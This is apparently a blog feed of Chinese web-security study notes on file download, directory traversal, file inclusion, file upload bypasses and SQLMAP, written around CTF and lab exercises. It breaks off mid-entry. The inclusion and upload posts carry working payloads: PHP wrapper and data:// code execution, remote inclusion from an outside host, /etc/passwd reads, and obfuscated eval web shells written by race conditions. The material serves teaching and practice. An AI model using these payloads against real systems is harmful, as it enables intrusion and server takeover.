      
    </entry>
    
    
    
    <entry>
      <title>51WEB攻防-文件下载</title>
      <link href="/2023/10/28/51WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
      <url>/2023/10/28/51WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>31、文件安全-前后台功能点-下载&amp;读取&amp;删除</li><li>32、目录安全-前后台功能点-目录遍历&amp;目录穿越</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><h2 id="文件安全-下载-删除-黑白盒"><a href="#文件安全-下载-删除-黑白盒" class="headerlink" title="文件安全-下载&amp;删除-黑白盒"></a>文件安全-下载&amp;删除-黑白盒</h2><ul><li>1、下载&#x3D;读取<br>常规下载URL：<a href="http://www.xiaodi8.com/upload/123.pdf">http://www.xiaodi8.com/upload/123.pdf</a><br>可能存在安全URL：<a href="http://www.xiaodi8.com/xx.xx?file=123.pdf">http://www.xiaodi8.com/xx.xx?file=123.pdf</a><br>利用：常规下载敏感文件（数据库配置，中间件配置，系统密匙等文件信息）  </li><li>2、文件删除（常出现后台中）<br>可能存在安全问题：前台或后台有删除功能应用<br>利用：常规删除重装锁定配合程序重装或高危操作</li></ul><h2 id="目录安全-遍历-穿越-黑白盒"><a href="#目录安全-遍历-穿越-黑白盒" class="headerlink" title="目录安全-遍历&amp;穿越-黑白盒"></a>目录安全-遍历&amp;穿越-黑白盒</h2><ul><li>1、目录遍历<br>目录权限控制不当，通过遍历获取到有价值的信息文件去利用  </li><li>2、目录穿越（常出现后台中）<br>目录权限控制不当，通过控制查看目录路径穿越到其他目录或判断获取价值文件再利用</li></ul><h3 id="黑盒分析："><a href="#黑盒分析：" class="headerlink" title="黑盒分析："></a>黑盒分析：</h3><ul><li>1、功能点<br>文件上传，文件下载，文件删除，文件管理器等地方  </li><li>2、URL特征<br>文件名：<br>download，down，readfile，read，del，dir，path，src，Lang等<br>参数名：<br>file、path、data、filepath、readfile、data、url、realpath等</li></ul><h3 id="白盒分析："><a href="#白盒分析：" class="headerlink" title="白盒分析："></a>白盒分析：</h3><p>上传类函数，删除类函数，下载类函数，目录操作函数，读取查看函数等  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>50WEB攻防-文件包含</title>
      <link href="/2023/10/27/50WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2023/10/27/50WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>29、文件包含-原理&amp;分类&amp;危害-LFI&amp;RFI</li><li>30、文件包含-利用-黑白盒&amp;无文件&amp;伪协议</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><p> <img src="/2023/10/27/50WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1.png"><br> <img src="/2023/10/27/50WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2.png"></p><h2 id="文件包含-原理-分类-利用-修复"><a href="#文件包含-原理-分类-利用-修复" class="headerlink" title="文件包含-原理&amp;分类&amp;利用&amp;修复"></a>文件包含-原理&amp;分类&amp;利用&amp;修复</h2><h3 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞</p><ul><li>1.1、分类<br>本地包含-Local File Include-LFI<br>远程包含-Remote File Include-RFI<br>差异原因：代码过滤和环境配置文件开关决定</li></ul><h3 id="2、白盒审计：（CTFSHOW）"><a href="#2、白盒审计：（CTFSHOW）" class="headerlink" title="2、白盒审计：（CTFSHOW）"></a>2、白盒审计：（CTFSHOW）</h3><ul><li>白盒发现：<br>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等<br>PHP：include、require、include_once、require_once等<br>include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行<br>require函数出现错误的时候，会直接报错并退出程序的执行<br>Java：java.io.File、java.io.FileReader等<br>ASP.NET：System.IO.FileStream、System.IO.StreamReader等</li></ul><h3 id="3、黑盒分析："><a href="#3、黑盒分析：" class="headerlink" title="3、黑盒分析："></a>3、黑盒分析：</h3><ul><li>黑盒发现：<br>主要观察参数传递的数据和文件名是否对应<br>URL中有path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼</li></ul><h3 id="4、利用"><a href="#4、利用" class="headerlink" title="4、利用"></a>4、利用</h3><p>本地利用思路：<br>1、配合文件上传<br>2、无文件包含日志<br>3、无文件包含SESSION<br>4、无文件支持伪协议利用<br>参考：<a href="https://blog.csdn.net/unexpectedthing/article/details/121276653">https://blog.csdn.net/unexpectedthing/article/details/121276653</a>  </p><ul><li>文件读取：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd  </span><br><span class="line">php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure></li><li>文件写入：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-encode/resource=phpinfo.php</span><br><span class="line">php://input POST:&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br><span class="line">-代码执行：</span><br><span class="line">php://input POST:&lt;?php phpinfo();?&gt;</span><br><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>远程利用思路：<br>直接搭建一个可访问的远程URL包含文件</li></ul><h3 id="5、修复见网上参考方案"><a href="#5、修复见网上参考方案" class="headerlink" title="5、修复见网上参考方案"></a>5、修复见网上参考方案</h3><h2 id="黑盒利用-VULWEB-有无包含文件"><a href="#黑盒利用-VULWEB-有无包含文件" class="headerlink" title="黑盒利用-VULWEB-有无包含文件"></a>黑盒利用-VULWEB-有无包含文件</h2><p><a href="http://testphp.vulnweb.com/showimage.php?file=index.php">http://testphp.vulnweb.com/showimage.php?file=index.php</a>  </p><h2 id="白盒利用-CTFSHOW-伪协议玩法"><a href="#白盒利用-CTFSHOW-伪协议玩法" class="headerlink" title="白盒利用-CTFSHOW-伪协议玩法"></a>白盒利用-CTFSHOW-伪协议玩法</h2><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a>  </p><h3 id="78-php-http协议"><a href="#78-php-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: ?file=php://filter/read=convert.base64-encode/resource=flag.php  </span><br><span class="line">payload: ?file=php://input post:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;  </span><br><span class="line">payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;  </span><br></pre></td></tr></table></figure><h3 id="79-data-http协议"><a href="#79-data-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: ?file=data://text/plain,&lt;?=system(&#x27;tac flag.*&#x27;);?&gt;</span><br><span class="line">payload: ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span><br><span class="line">payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="80-81-日志包含"><a href="#80-81-日志包含" class="headerlink" title="80 81-日志包含"></a>80 81-日志包含</h3><p>1、利用其他协议,如file,zlib等<br>2、利用日志记录UA特性包含执行<br>分析需文件名及带有php关键字放弃<br>故利用日志记录UA信息，UA带入代码<br>包含：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  </p><h3 id="82-86-SESSION包含"><a href="#82-86-SESSION包含" class="headerlink" title="82-86-SESSION包含"></a>82-86-SESSION包含</h3><p>利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含<br>自定义session名字，条件竞争访问session文件，触发创建新文件  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://xxxx.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;?&gt;&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/lnterpreter/p/14086164.html">https://www.cnblogs.com/lnterpreter/p/14086164.html</a><br><a href="https://www.cnblogs.com/echoDetected/p/13976405.html">https://www.cnblogs.com/echoDetected/p/13976405.html</a>  </p><h3 id="87-php-filter-write-加密编码"><a href="#87-php-filter-write-加密编码" class="headerlink" title="87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码"></a>87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</h3><ul><li>1、利用base64:<br>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;123.php<br>content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg&#x3D;&#x3D;  </li><li>2、利用凯撒13：<br>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;2.php<br>content&#x3D;<?cuc riny($_CBFG[1]);?></li></ul><h3 id="88-data-base64协议"><a href="#88-data-base64协议" class="headerlink" title="88-data&amp;base64协议"></a>88-data&amp;base64协议</h3><p>过滤PHP，各种符号，php代码编码写出无符号base64值<br>Payload：file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs&#x2F;PmFk  </p><h3 id="117-php-filter-write-新的算法"><a href="#117-php-filter-write-新的算法" class="headerlink" title="117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法"></a>117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法</h3><p>convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$result = iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, &#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);</span><br><span class="line">echo &quot;经过一次反转:&quot;.$result.&quot;\n&quot;;</span><br><span class="line">echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, $result);</span><br><span class="line">?&gt;</span><br><span class="line">Payload：file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br><span class="line">contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>49WEB攻防-文件上传</title>
      <link href="/2023/10/27/49WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/10/27/49WEB%E6%94%BB%E9%98%B2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>27、文件上传-安全解析方案-目录权限&amp;解码还原</li><li>28、文件上传-安全存储方案-分站存储&amp;OSS对象</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><h2 id="文件-解析方案-执行权限-解码还原"><a href="#文件-解析方案-执行权限-解码还原" class="headerlink" title="文件-解析方案-执行权限&amp;解码还原"></a>文件-解析方案-执行权限&amp;解码还原</h2><ul><li>1、执行权限<br>文件上传后存储目录不给执行权限  </li><li>2、解码还原<br>数据做存储，解析固定（文件后缀名无关）<br>文件上传后利用编码传输解码还原</li></ul><h2 id="文件-存储方案-分站存储-OSS对象"><a href="#文件-存储方案-分站存储-OSS对象" class="headerlink" title="文件-存储方案-分站存储&amp;OSS对象"></a>文件-存储方案-分站存储&amp;OSS对象</h2><ul><li>1、分站存储<br>upload.xiaodi8.com 上传<br>images.xiaodi8.com 存储  </li><li>2、OSS对象<br>Access控制-OSS对象存储-Bucket对象</li></ul><h2 id="如何判断"><a href="#如何判断" class="headerlink" title="如何判断"></a>如何判断</h2><p>实例分析判断  </p><h2 id="安全绕过"><a href="#安全绕过" class="headerlink" title="安全绕过"></a>安全绕过</h2><p>以上方案除目录设置权限如能换目录解析绕过外，其他均无解  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>48WEB攻防-php文件上传</title>
      <link href="/2023/10/24/48WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/10/24/48WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>24、PHP-中间件-文件上传-CVE&amp;配置解析</li><li>25、PHP-编辑器-文件上传-第三方引用安全</li><li>26、PHP-CMS源码-文件上传-已知识别到利用</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><p> <img src="/2023/10/24/48WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A03.png"></p><h2 id="PHP-中间件-上传相关-Apache-Nginx"><a href="#PHP-中间件-上传相关-Apache-Nginx" class="headerlink" title="PHP-中间件-上传相关-Apache&amp;Nginx"></a>PHP-中间件-上传相关-Apache&amp;Nginx</h2><p>复现漏洞环境：vulhub （部署搭建看打包视频）<br>由于PHP搭建常用中间件：IIS，Apache，Nginx<br>Web搭建在存在漏洞的中间件上，漏洞影响这文件的解析即配合上传  </p><h2 id="PHP-编辑器-上传相关-第三方处理引用"><a href="#PHP-编辑器-上传相关-第三方处理引用" class="headerlink" title="PHP-编辑器-上传相关-第三方处理引用"></a>PHP-编辑器-上传相关-第三方处理引用</h2><p>复现漏洞环境：ueditor （部署搭建看打包视频）<br>由于编辑器漏洞较少，实战碰到机会不大，主要理解漏洞产生的思路<br>参考：<a href="https://cloud.tencent.com/developer/article/2200036">https://cloud.tencent.com/developer/article/2200036</a><br>参考：<a href="https://blog.csdn.net/qq_45813980/article/details/126866682">https://blog.csdn.net/qq_45813980/article/details/126866682</a><br>引用到外部的第三方编辑器实现文件上传，编辑器的安全即是上传安全  </p><h2 id="PHP-CMS源码-上传相关-已知识别到利用"><a href="#PHP-CMS源码-上传相关-已知识别到利用" class="headerlink" title="PHP-CMS源码-上传相关-已知识别到利用"></a>PHP-CMS源码-上传相关-已知识别到利用</h2><p>复现漏洞环境：通达OA-V11.2<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从未知的源码体系测试原生态上传安全，现在是已知CMS源码架构，利用已知的漏洞测试  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>47WEB攻防-php文件上传</title>
      <link href="/2023/10/24/47WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/10/24/47WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>20、PHP-原生态-文件上传-检测后缀&amp;黑白名单</li><li>21、PHP-原生态-文件上传-检测信息&amp;类型内容</li><li>22、PHP-原生态-文件上传-函数缺陷&amp;逻辑缺陷</li><li>23、PHP-原生态-文件上传-版本缺陷&amp;配置缺陷</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><p> <img src="/2023/10/24/47WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01.png"><br> <img src="/2023/10/24/47WEB%E6%94%BB%E9%98%B2-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02.png"></p><h2 id="学习前必读："><a href="#学习前必读：" class="headerlink" title="学习前必读："></a>学习前必读：</h2><p>1、课前一定要明白：<br>无文件解析安全问题上，格式解析是一对一的（不能jpg解析php）<br>换句话来说有解析错误配置或后缀解析漏洞时才能实现格式差异解析  </p><p>2、文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战！  </p><h2 id="测试环境安装参考："><a href="#测试环境安装参考：" class="headerlink" title="测试环境安装参考："></a>测试环境安装参考：</h2><p><a href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a><br><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br><a href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a>  </p><ul><li><p>1、下载上述资源  </p></li><li><p>2、docker安装  </p><figure class="highlight plaintext"><figcaption><span>-d 或 f8x -docker</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sqlsec/upload-labs-docker.git</span><br><span class="line">cd upload-labs-docker</span><br></pre></td></tr></table></figure></li><li><p>3、进入项目文件夹  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd upload-labs-docker  </span><br><span class="line">docker pull c0ny1/upload-labs(已编辑)  </span><br><span class="line">docker run -dit -p 80:80 $(docker images | grep &quot;upload&quot; -aq)</span><br><span class="line">http://ip:80</span><br></pre></td></tr></table></figure></li><li><p>4、一键部署运行</p></li></ul><p><code>docker-compose up -d </code> </p><h2 id="upload-labs-docker知识点："><a href="#upload-labs-docker知识点：" class="headerlink" title="upload-labs-docker知识点："></a>upload-labs-docker知识点：</h2><ul><li><p>1、前端JS<br>如何判断是否是前端验证呢？<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了</p></li><li><p>2、.htaccess<br>AddType application&#x2F;x-httpd-php .png  </p></li><li><p>3、MIME类型<br>Content-Type：image&#x2F;png  </p></li><li><p>4、文件头判断<br>GIF89a  </p></li><li><p>5、黑名单-过滤不严<br>无递归，pphphp  </p></li><li><p>6、黑名单-过滤不严<br>系统大小写敏感属性  </p></li><li><p>7、低版本GET-%00截断<br>自动解码一次<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;x.php%00  </p></li><li><p>8、低版本POST-%00截断<br>手工解码一次<br>..&#x2F;upload&#x2F;x.php%00 二次解码  </p></li><li><p>9、黑名单-过滤不严<br>php3  </p></li><li><p>10、逻辑不严-条件竞争  </p><?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?><p>‘);?&gt;<br>上传不断发包<br>请求不断发包  </p></li><li><p>11、二次渲染<br>先搞个正常图片，上传导出渲染后的图片<br>对比保留部分，在保留部分添加后门代码<br>最后利用提示的文件包含执行图片后门代码  </p></li><li><p>11、函数缺陷<br>move_uploaded_file 1.php&#x2F;.  </p></li><li><p>12、代码审计-数组绕过  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------174283082921961</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">http://2.php/</span><br><span class="line">-----------------------------174283082921961</span><br><span class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line">gif</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>46WEB攻防-SQLMAP</title>
      <link href="/2023/10/23/46WEB%E6%94%BB%E9%98%B2-SQLMAP/"/>
      <url>/2023/10/23/46WEB%E6%94%BB%E9%98%B2-SQLMAP/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">41WEB攻防</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>16、注入工具-SQLMAP-常规猜解&amp;字典配置</li><li>17、注入工具-SQLMAP-权限操作&amp;文件命令</li><li>18、注入工具-SQLMAP-Tamper&amp;使用&amp;开发</li><li>19、注入工具-SQLMAP-调试指纹&amp;风险等级</li></ul><h2 id="章节点："><a href="#章节点：" class="headerlink" title="章节点："></a>章节点：</h2><p>Web层面：Web2.0 &amp; Web3.0<br>语言安全：JS，ASP，PHP，NET，Java，Python等（包含框架类）<br>OWTOP10：注入，文件安全，XSS，RCE，XXE，CSRF，SSRF，反序列化，未授权访问等<br>业务逻辑：水平垂直越权，支付签约&amp;购买充值，找回机制，数据并发，验证码&amp;弱口令等<br>特殊漏洞：JWT，CRLF，CORS，重定向，JSONP回调，域名接管，DDOS，接口枚举等<br>关键技术：POP链构造，JS逆向调试，NET反编译，JAVA反编译，代码解密，数据解密等<br>Web3.0：未待完续筹备中….  </p><p> <img src="/2023/10/23/46WEB%E6%94%BB%E9%98%B2-SQLMAP/sqlmap.png"></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a>  </p><h2 id="数据猜解-库表列数据-字典"><a href="#数据猜解-库表列数据-字典" class="headerlink" 